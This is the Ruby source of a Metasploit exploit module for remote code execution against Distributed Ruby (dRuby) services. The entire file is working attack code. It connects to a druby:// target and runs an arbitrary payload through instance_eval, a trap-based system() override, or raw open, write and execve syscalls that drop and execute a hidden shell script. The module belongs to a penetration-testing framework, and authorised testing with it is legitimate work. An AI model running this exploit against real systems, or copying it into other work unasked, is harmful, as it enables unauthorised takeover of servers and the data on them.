##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'drb/drb'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Distributed Ruby Remote Code Execution',
      'Description'    => %q{
        This module exploits remote code execution vulnerabilities in dRuby.
      },
      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #(Phenoelit)
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.ruby-doc.org/stdlib-1.9.3/libdoc/drb/rdoc/DRb.html' ],
          [ 'URL', 'http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/' ],
          [ 'URL', 'http://bugkraut.de/posts/tainting' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 32768,
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [
        ['Automatic', { method: 'auto'}],
        ['Trap',      { method: 'trap'}],
        ['Eval',      { method: 'instance_eval'}],
        ['Syscall',   { method: 'syscall'}],
      ],
      'DisclosureDate' => 'Mar 23 2011',
      'DefaultTarget' => 0))

      register_options(
        [
          OptString.new('URI', [false, "The URI of the target host (druby://host:port) (overrides RHOST/RPORT)", nil]),
          Opt::RHOST(nil, false),
          Opt::RPORT(8787)
        ])
  end

  def method_trap(p)
    p.send(:trap, 23,
      :"class Object\ndef my_eval(str)\nsystem(str.untaint)\nend\nend")
    # Decide if this is running on an x86 or x64 target, using the kill(2) syscall
    begin
      pid = p.send(:syscall, 20)
      p.send(:syscall, 37, pid, 23)
    rescue Errno::EBADF
      # 64 bit system
      pid = p.send(:syscall, 39)
      p.send(:syscall, 62, pid, 23)
    end
    p.send(:my_eval, payload.encoded)
  end

  def method_instance_eval(p)
    p.send(:instance_eval,"Kernel.fork { `#{payload.encoded}` }")
  end

  def method_syscall(p)
    filename = "." + Rex::Text.rand_text_alphanumeric(16)

    begin
      # Decide if this is running on an x86 or x64 target.
      # This syscall number is getpid on x86, which will succeed,
      # or writev on x64, which will fail due to missing args.
      j = p.send(:syscall, 20)
      # syscall open
      i =  p.send(:syscall, 8, filename, 0700)
      # syscall write
      p.send(:syscall, 4, i, "#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
      # syscall close
      p.send(:syscall, 6, i)
      # syscall fork
      p.send(:syscall, 2)
      # syscall execve
      p.send(:syscall, 11, filename, 0, 0)
      print_status("attempting x86 execve of #{filename}")

    # likely x64
    rescue Errno::EBADF
      # syscall creat
      i = p.send(:syscall, 85, filename, 0700)
      # syscall write
      p.send(:syscall, 1, i, "#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
      # syscall close
      p.send(:syscall, 3, i)
      # syscall fork
      p.send(:syscall, 57)
      # syscall execve
      p.send(:syscall, 59, filename, 0, 0)
      print_status("attempting x64 execve of #{filename}")
    end

    register_file_for_cleanup(filename) if filename
  end

  def exploit
    if !datastore['URI'].blank? && !datastore['RHOST'].blank?
      print_error("URI and RHOST are specified, unset one")
      return
    end

    if datastore['URI'].blank? && datastore['RHOST'].blank?
      print_error("neither URI nor RHOST are specified, set one")
      return
    end

    unless datastore['URI'].blank?
      serveruri = datastore['URI']
      (datastore['RHOST'], datastore['RPORT']) = serveruri.sub(/druby:\/\//i, '').split(':')
    else
      serveruri = "druby://#{datastore['RHOST']}:#{datastore['RPORT']}"
    end

    DRb.start_service
    p = DRbObject.new_with_uri(serveruri)
    class << p
      undef :send
    end

    if target[:method] == 'auto'
      methods = ["instance_eval", "syscall", "trap"]
    else
      methods = [target[:method]]
    end

    methods.each do |method|
      begin
        print_status("Trying to exploit #{method} method")
        send("method_" + method, p)
        handler(nil)
        break
      rescue SecurityError, DRb::DRbConnError, NoMethodError
        print_warning("Target is not vulnerable to #{method} method")
      end
    end

  end
end
